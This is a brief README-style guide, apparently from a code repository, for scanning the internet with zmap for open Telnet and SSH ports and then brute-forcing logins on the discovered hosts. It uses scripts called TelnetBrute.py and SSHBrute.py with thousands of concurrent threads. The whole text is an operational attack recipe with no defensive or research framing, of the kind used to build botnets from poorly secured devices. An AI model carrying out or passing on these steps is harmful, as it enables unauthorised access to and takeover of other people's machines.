[VPS CentOS 6.9 2GB-RAM] 

- Install zmap

yum update -y 

sh zmap_auto_install.sh

- Scan Telnet Ips

1- zmap -p23 -o mfu.txt -N 25000   OR   zmap -p23 -o mfu.txt -w example.lst
1,5-- zmap -p22 -o mfussh.txt -w -N 25000 

- Bruteforce 

2- ulimit -n 999999

3- python TelnetBrute.py mfutrl.txt 15000 telnettest.txt OR python SSHBrute.py mfussh.txt 15000 sshtest.txt 




<img src="https://raw.githubusercontent.com/XeljomudoX/TelnetBrute.py/master/lul.png">



